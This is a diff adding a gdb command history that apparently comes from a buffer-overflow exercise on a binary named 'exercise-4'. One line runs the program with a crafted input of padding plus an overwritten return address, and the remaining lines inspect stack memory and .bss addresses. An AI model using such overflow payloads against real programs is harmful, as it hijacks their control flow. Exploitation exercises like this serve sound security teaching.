@@ -1,0 +1,15 @@
+file exercise-4
+disas main
+b*main+194
+r < <(python -c 'print "A"*140 + "\x7d\x84\x04\x08" + "A"*148')
+x /150wx $esp
+x /150wx $esp-0x40
+x /150wx $esp+0x40
+x /150wx $esp-0x40
+x /150wx $esp-0x100
+q
+p &bss
+p &__bss_start
+info file
+p &__bss_start
+q
